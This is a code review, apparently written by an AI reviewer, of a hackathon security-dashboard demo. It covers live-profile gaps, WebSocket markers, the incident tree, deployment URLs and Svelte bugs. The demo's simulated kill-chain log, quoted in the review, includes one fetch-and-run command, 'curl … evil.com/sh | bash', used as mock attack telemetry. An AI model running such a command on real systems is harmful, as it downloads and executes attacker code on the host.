# Code Review — CR-1
**Scope:** vX+1 deployment (answers-driven) vs `input/answers.md` (A) and `input/DEMO.md` CC* requirements (B)  
**Date:** 2026-06-19  
**Reviewer:** Claude Sonnet 4.6  
**Priority:** A (answers.md) → B (CC* DEMO.md) → C (prior docs / contracts / codebase)

---

## Executive summary

The vX+1 build (`delivery/delivery-v2/app/`) correctly ingests most of `answers.md` and ships the left-rail shell, Beta-as-mock surfaces, incident tree, onboarding command, Walrus decrypt, K8s UI hint, and WebSocket markers. The CC* critical path (banner → drawer → kill-chain) is present and broadly functional. Several gaps, ambiguities, and questions remain — documented below in priority order.

---

## PART 1 — Gaps vs `answers.md` (Priority A)

### A-1 🔴 C5 LIVE PROFILE — second tier absent from the deployed build

**Answer:** "Can you do both? mock-by-default for now and the live profile for implementation tomorrow."

**What exists:** `config.json` has `suiRpcUrl`, `wsUrl`, `walrusGateway` keys. `scenario.ts` has a `TODO(live, answer I2)` WebSocket comment. That is the entirety of the live profile.

**What is missing:**
- No `@mysten/sui.js` call anywhere (not in `App.svelte`, not in `scenario.ts`, not imported in `package.json`). The config flag `mock:false` would currently change nothing — the app always reads client-side fixtures.
- No Walrus fetch path: the "Decrypt (Seal)" button fires `note('Seal browser decrypt')` which shows a toast and sets `decrypted = true`. No actual `fetch()` to `walrusGateway` is attempted.
- The live profile is not documented as step V1 in `questions_v3_to_v4_qa.md`, which is correct, but there is no stub adapter file (`src/lib/data/adapter.ts` referenced in ADR-0006) where the live path would be wired. That file does not exist.

**Question for next session:** Is the live profile scope still "tomorrow" or deferred further? If it is in scope for v4, the adapter file stub should be created now so the TODO markers have a concrete home.

---

### A-2 🟡 I2 — WebSocket markers present but incomplete

**Answer:** "The WebSocket functionality is already implemented, mark the places in the code that will have to be filled with the right data in the next step to accept the WebSocket output."

**What exists:** One `// TODO(live, answer I2)` comment in `onMount` in `App.svelte:25–26` (a commented-out WebSocket open + message handler).

**What is missing:**
- The Chain Activity tab shows a `WS` badge when `cfg.wsUrl` is truthy (`App.svelte:163`) — this is correct and visible.
- The Fleet Telemetry tab has **no** WS marker — it is the natural receiver of live telemetry events. Mark it.
- The Incidents/Alerts tabs have **no** WS marker — the `applyEvent` function referenced in the comment doesn't exist; there is no stub for what a live event would do to the app state.
- **Ambiguity:** "The WebSocket functionality is already implemented" suggests there is an existing WS server/agent-side implementation. But the FE has no actual WS client code. Where is the existing implementation? If it is on the agent/backend, the adapter stub should specify the message schema so the TODO markers can be precise.

---

### A-3 🟡 I3 — Incident correlation tree is flat, not a real tree

**Answer:** "Yes, that has already been partly implemented, but I'd like to see your version."

**What exists:** `App.svelte:172–177` renders `incidentTree` from `scenario.ts:85–95`. It is a two-level structure: a root incident and its child events. The root has `sev`, `id`, `title`; children have `sev`, `title`, `tx`. The UI renders them as `t-root`/`t-child` divs with no expand/collapse, no selection, no drill-down.

**What is missing / open question:**
- No expand/collapse — all children are always shown. For a real kill-chain tree this may be fine at demo scale (2 incidents, 4+1 children) but will not scale.
- "That has already been partly implemented" — where? The original demo (`demo_designV2_genV1`?) or an agent-side incident tree? If there is existing FE code, should the vX+1 version align or supersede it?
- The tree does not highlight the active CC* incident (INC-991) differently from the background one (INC-984). During the `isolated` phase, INC-991 should pulse/stand out.

---

### A-4 🟡 I4 — Walrus/Seal browser decrypt is a mock, not a real fetch

**Answer:** "Agent proxy will be implemented later on, for the presentation let's do the browser fetch+decrypt."

**What exists:** `App.svelte:198` — clicking "Decrypt (Seal)" fires `note('Seal browser decrypt')` and sets `decrypted = true`, then renders `walrus:blob:7f3a… · decrypted`. No actual `fetch()` is made.

**Gap:** The answer explicitly asks for **browser fetch+decrypt** (not just a mock toggle). The current implementation is indistinguishable from a pure mock button. For the demo story this may be acceptable, but:
- There is no `@mysten/walrus` package in `package.json`. Is it expected?
- There is no `config.walrusGateway` usage anywhere in the code. The config key exists but is never read.
- **Question:** For the hackathon demo, is a simulated "decrypting..." spinner + fake blob display sufficient, or should we do a real `fetch(walrusGateway + blobId)` even if the data is a hardcoded test blob?

---

### A-5 🟡 I5 — Talus correlation demo is static

**Answer:** "Show how Talus could theoretically be used to perform correlations, detections etc."

**What exists:** `App.svelte:186–192` — three cards: (1) conditional bad/nominal state driven by `compromised`, (2) static "Correlation: exec → FIM → C2", (3) static "Lateral-movement watch". The Talus tab does change dynamically when the CC* scenario runs (card 1 changes color and text).

**Minor gap:** Cards 2 and 3 are always static. They could be made slightly more interesting by also reacting to the CC* phase (e.g., card 2 glows when the kill-chain is active). Currently they read as dead placeholder content regardless of scenario state.

---

### A-6 🟡 G1 — "Roles & Models" tab exists but answer says "Add it in a separate tab"

**Answer to G1:** "Add it in a separate tab pls."

**What exists:** `App.svelte:232–235` — a "Roles & Models" (`personas`) tab under the `Platform` group of the left rail, marked `future · non-functional`. This satisfies the answer.

**Ambiguity:** The answer says "a separate tab" — was this meant as a top-level navigation item or a subtab within Platform? The current implementation puts it inside `Platform`, which is reasonable, but worth confirming for the final demo flow.

---

### A-7 🟢 I12 — Onboarding invite token labeled "MOCK" — is that intentional for the demo?

**Answer:** "This should generate a command that will register an agent to a contract with an invitation token, please note that we only have public contracts for now, so the invitation token can be a mock."

**What exists:** `App.svelte:54` — `TH-INVITE-9F2A-MOCK` visible in the `curl` command. The `connectCmd` string hard-codes this. The UI shows it as a literal string in a `<pre>` block with a note that it is a mock.

**Question:** Is the intent that a **real** token format is shown (e.g., a UUID or base58 string that looks real) with a small "this is a mock invite — real tokens are issued by the contract" tooltip? Or is `TH-INVITE-9F2A-MOCK` the intentional demo token name? The current `MOCK` suffix breaks immersion.

---

### A-8 🟢 I9/I10 — IPFS/Unstoppable Domains: `thorium.crypto` hard-coded

**Answer I9:** "It will be run on an unstoppable domain."  
**Answer I10:** "UnstoppableDomains"

**What exists:** `config.json` has `"unstoppableDomain": "thorium.crypto"`. The footer reads "deploys to thorium.crypto (IPFS)". The `connectCmd` uses `${cfg.unstoppableDomain ?? 'thorium.crypto'}`.

**Questions:**
- Is `thorium.crypto` the actual registered Unstoppable Domain? If so, this is correct. If not, using it publicly (even in a demo) may confuse someone who tries to visit it.
- The `base: './'` setting in `vite.config.ts` is IPFS-safe. However, hash routing is specified in ADR-0008 but SvelteKit is not configured for hash-based routing. The current app appears to use a single-page (no router) architecture. Is that intentional for this demo phase?

---

## PART 2 — Gaps vs CC* requirements (Priority B, `input/DEMO.md`)

### B-1 🔴 CC* Acceptance criterion: "A viewer can watch connect → healthy → attack → NOT WORTHY → alert in <60s"

**What exists:** The scenario stepper runs: connected (1.1s) → healthy (1.6s) → attacked (1.6s) → isolated (drawer opens). Total: ~4.3s to reach the alert. This is well within 60s.

**Gap:** The **"connect"** step (`phase === 'connected'`) renders a "Connecting…" badge in the endpoint table, but the pod's CPU/RAM/disk show minimal values (4%, 20%, 30%) and the sparkline shows a healthy green curve. This is visually inconsistent with a pod that is "connecting and not yet attested." A brief grey/pending sparkline would be more accurate.

**Minor gap:** During the `connected` phase, the Kill-chain timeline (`timeline()`) already shows "Pod connected & attested / 14:02:11" — this is correct sequencing but the drawer is not open during this phase, so the timeline is invisible unless the user opens the drawer manually. The story is only fully visible in the `isolated` phase when the drawer auto-opens.

---

### B-2 🔴 CC* Acceptance criterion: "On-chain interaction + OK telemetry are visible in the healthy phase"

**What exists:** `App.svelte:167–168` — Chain Activity shows `TelemetryReported cpu 12%` and `AgentRegistered` events when `step >= 2` (healthy) and `step >= 1` (connected). The endpoint table shows `is_active=true` and a green sparkline. This satisfies the criterion.

**Minor gap:** The `healthy` phase does not trigger any KPI change on the Overview tab — "Active Agents" stays at 24, "Critical Threats" at 0. Consider a subtle animation or "new agent connected" flash when transitioning to `healthy` to make the "Sui contract interacts with it" moment visible.

---

### B-3 🔴 CC* Acceptance criterion: "NOT-OK telemetry/logs + the 'Not Worthy' status are visible after the attack"

**What exists:** The endpoint table shows `NOT WORTHY` badge with pulsing red dot, `is_active=false`, CPU 96%, RAM 92%, sparkline turns red. Chain Activity shows `IncidentReport` CRITICAL and `ClassificationReported 0.91`. Fleet Telemetry tab also shows the red row. This broadly satisfies the criterion.

**Gap:** There is no **log view** showing NOT-OK logs. The CC* story in `DEMO.md §5` says "NOT-OK log + telemetry is clearly visible in the frontend." The current implementation has telemetry (sparkline, numbers) but no log output (syslog/eBPF event stream). The Kill-chain timeline in the drawer shows `eBPF execve: curl -s http://evil.com/sh | bash` — this is log-like content but only visible inside the drawer, which is only open in the `isolated` phase and only on the overview/endpoints tab.

**Suggestion:** A small "Recent logs" sub-panel in the telemetry tab or inside the Alerts card would make the "NOT-OK log" criterion unambiguous even for a demo audience who doesn't immediately open the drawer.

---

### B-4 🟡 CC* "The alert is unmissable and looks production-grade (Stripe bar)"

**What exists:** The banner (`App.svelte:107–115`) is shown when `compromised === true`. It has a pulsing red dot, CRITICAL badge, before/after chip "✓ Healthy 40s ago", "⚡ Auto-isolated in 2s" speed badge, "Mute" and "View incident →" buttons.

**Observations:**
- The banner is injected between the topbar and the main content area. On wide screens this will look good. On 1024px (the lower desktop breakpoint from I18) the banner text may wrap awkwardly.
- The banner's `role="alert"` is correct for accessibility.
- **Missing:** The banner is only visible on the `overview` and `endpoints` tabs (because it is conditionally rendered only when `compromised`). But if the user navigates to e.g. `Telemetry` while the scenario is running, the banner still appears because `compromised` is global — that is correct. Actually re-reading the code: the banner is rendered unconditionally (outside `{#if tab === ...}`), so it shows on all tabs. Good.
- **Missing from the mockup vs code:** The `cc-alert.html` mockup shows a "Before/After" strikethrough on "Healthy 40s ago" — the `<span class="was">` in code does this via CSS. The class name `was` suggests a strikethrough style, but the CSS is not included in the tracked file (it's in `app.css` which is not fully readable here). If the strikethrough is missing from the live app, the before/after contrast is lost.

---

### B-5 🟡 CC* "Response-hint actions are present (placeholders clearly labeled)"

**What exists:** `scenario.ts:62–67` — 4 response actions (Notify on-call, Slack, Freeze/Isolate/Kill, Execute skill/Claude Code). Each renders as a button with a "Coming soon" label. `App.svelte:150` — `onclick={() => note(a.l)}` fires a "mock / coming soon" toast.

**Minor gap:** The buttons say "Coming soon" but the CC* spec says "hint / placeholder." The current labeling is clear. However, the **"Execute skill / connect Claude Code"** action (`🤖 Execute skill / connect Claude Code`) is potentially a distinctive differentiator for the hackathon (Sui/AI narrative). Consider making this button open a drawer or modal with a slightly richer "future integration" description rather than just a toast, to highlight the AI-agent response story.

---

## PART 3 — Deployment ambiguities and process gaps

### D-1 🔴 vX+1 live URL is an ephemeral ngrok tunnel

**Deployment log:** `https://4ae4-213-134-178-35.ngrok-free.app` (vX+1).

**Problem:** ngrok free-tier tunnels are ephemeral (die with the session/machine). The commit `ba7f512` mentions this URL prominently. If a judge or collaborator tries this URL at any point after the session ended, they get a 404 or ngrok's "this tunnel is no longer active" page.

**Open question for user:** Is the Unstoppable Domains + IPFS deployment (`thorium.crypto`) on the roadmap for v4, or is ngrok + LAN the accepted state for now? The `questions_v3_to_v4_qa.md` item V2 tracks this but has no answer yet.

**Suggestion for next session:** Pin an IP-based LAN URL in `LIVE-DEMO.md` as the "always works if you're on the same network" fallback, alongside the ngrok URL (which changes each session). Add a note that the URL in the last commit expires.

---

### D-2 🟡 Delivery-v2 tracked copy vs `.ignored/` dev copy — sync risk

**ADR-0008 / RUNBOOK §7:** The tracked app at `delivery/delivery-v2/app/` must be kept in sync with `.ignored/fe-demo/demo_designV2_genV2/app/` via rsync.

**Observation:** The tracked `delivery-v2/app/src/App.svelte` is the vX+1 version (left-rail, all tabs). But the vX (v2) was a different build (top-tabs, no Beta surfaces). It is unclear whether the tracked copy was updated to vX+1 or still reflects vX. The `package.json` and `src/lib/scenario.ts` in the tracked copy both look like vX+1. Likely correct, but should be explicitly verified by the next agent before deploying from the tracked copy.

---

### D-3 🟡 GitHub Pages pipeline exists but is blocked

**Status.md:** Pages is blocked because the repo is private. `delivery-v2/.github/workflows/deploy-pages.yml` is in place.

**Open question:** The repo owner (jakubGodula? or aleksander.w1992?) needs to make the repo public or upgrade to a plan with private Pages. This is mentioned in `questions_v3_to_v4_qa.md` (V2) but not actioned. For the hackathon deadline, this is the most impactful unresolved deployment question.

---

### D-4 🟢 `dist-vX` archive is gitignored

The `dist-vX` folder that archives the vX build is inside `.ignored/`, which is gitignored. So the archived build is not recoverable from git history. This is by design (large binary), but it means that if the local machine is wiped, vX is lost. The `deployments.md` records the URL but if the tunnel is dead, vX is inaccessible.

---

## PART 4 — Code quality and architecture observations

### Q-1 🟡 No adapter layer despite ADR-0006 calling for one

`ADR-0006` specifies: "all mapping to English view-models happens in the FE **data adapter** (`src/lib/data/adapter.ts`)"

`src/lib/data/adapter.ts` does not exist. All data logic is in `scenario.ts` which returns English-keyed TypeScript types directly. This is fine for the pure-mock phase, but when the live path is wired, there is no boundary to implement. The next agent should create a stub `adapter.ts` with the Polish→English mapping shape so the TODO is concrete.

---

### Q-2 🟡 `connectCmd` uses string interpolation on `cfg` before config loads

`App.svelte:54`:
```ts
const connectCmd = `curl … --invite TH-INVITE-9F2A-MOCK --owner $(whoami)`
```
This is a `const` at module level. `cfg` at this point is the `$state` default `{ scope: 'alfa', …, mock: true }`. `cfg.unstoppableDomain` is `undefined` at declaration time, so the `??` fallback fires immediately and the domain is always `'thorium.crypto'` in `connectCmd` even if `config.json` specifies a different domain.

This is a minor reactive reactivity bug in Svelte 5 — `connectCmd` should be a `$derived` that reads `cfg.unstoppableDomain` reactively. Low priority since the fallback value is the intended one, but it will break if the config domain changes.

---

### Q-3 🟡 `decrypted` state is global, not scoped to a row

`App.svelte:53` — `let decrypted = $state(false)`. There is one decrypt button and one `decrypted` flag. If additional sealed rows are added to the Vulns table (e.g., `db-02`'s row), they all share the same decrypted state. Each row needs its own decrypt state or the flag needs to be a `Set` of decrypted blob IDs.

---

### Q-4 🟢 Timer leak risk in the scenario stepper

`App.svelte:36–48` — `timer` holds a single `setTimeout` reference. `runScenario()` calls `clearTimeout(timer)` at the start, which prevents overlapping scenarios. However, if `autoplay` is toggled off mid-sequence, `reset()` calls `clearTimeout(timer)` — this works. The risk is if `onDestroy` is never called (there is no `onDestroy` cleanup). In a single-page app with no routing this is harmless, but when an actual router is added, the timer will leak across route changes.

---

### Q-5 🟢 `MSSP tenant switch` mock — tenant state not scoped

`App.svelte:14` — `let tenant = $state('Acme Corp')`. The tenant switcher button fires `note('MSSP tenant switch')` and never updates `tenant`. The topbar always shows "Acme Corp ▾". The tenant state has no effect on any data displayed. This is expected as it is a mock, but the button label should perhaps reflect "mock" visually (it currently doesn't have a `tag` like the nav items do).

---

### Q-6 🟢 English-only vs Polish wire keys — ADR-0006 TODO still open

ADR-0006 has an open TODO:  
> "Decide whether to also expose an English-keyed variant of the contract."

`openapi/thorium-xdr.openapi.yaml` (gen-v1) still contains Polish keys (`kod`, `tresc`, etc.). The adapter that would translate them doesn't exist. The mock currently bypasses this entirely (no Prism server runs in vX+1 — the app reads client-side fixtures). When the live path is wired, this will be the first concrete friction point.

---

## PART 5 — Ambiguities requiring user input for v4

These are items where the existing documentation does not provide enough context to make a decision autonomously, and they block quality improvements:

| # | Item | Why it matters | Needed from user |
|---|---|---|---|
| P1 | Is `thorium.crypto` the actual registered UD domain? | Used in footer, onboarding cmd, LIVE-DEMO | Confirm or provide correct domain |
| P2 | What is the WS message schema? | `TODO(live, I2)` markers need a concrete shape | Provide or link to agent WS API spec |
| P3 | Is the "live profile for tomorrow" still in scope for v4? | Determines whether adapter.ts stub should be created | Confirm |
| P4 | Where is the "partly implemented" incident tree? | I3 answer implies existing code; should vX+1 align? | Point to the existing code or confirm vX+1 supersedes |
| P5 | `TH-INVITE-9F2A-MOCK` — intentional or should it look real? | Demo immersion | Confirm token format |
| P6 | Durable public URL — make repo public, or use IPFS now? | V2 in v3→v4 questions, still open | Decision needed before hackathon |

---

## PART 6 — What is working well (do not break)

- **CC* stepper timing** (4.3s total) — fast, dramatic, appropriate for a live demo.
- **Two-fidelity approach** — interactive core + mock surfaces labeled clearly. The `tag="mock"` pattern is consistent and honest.
- **Left-rail navigation** — grouping (Monitor/Detect/Respond/Platform) matches industry conventions and scales to the 18+ sections.
- **Kill-chain timeline** in the drawer — timestamped, color-coded (ok/bad), climax event highlighted. This is the strongest "Stripe bar" moment in the current build.
- **On-chain evidence** section — `tx 0x9aBcDeF…01 · IncidentReport{severity:"CRITICAL"}` is visible and plausible.
- **`config.json` config-flip architecture** — `mock:false` is the right seam for the live path.
- **ngrok vs trycloudflare lesson** — the RUNBOOK correctly documents using the user's resolver (`192.168.0.1`) to verify reachability.
- **`questions_v3_to_v4_qa.md`** — appropriately concise (~30% of v2→v3 length), correctly captures the genuinely open items.
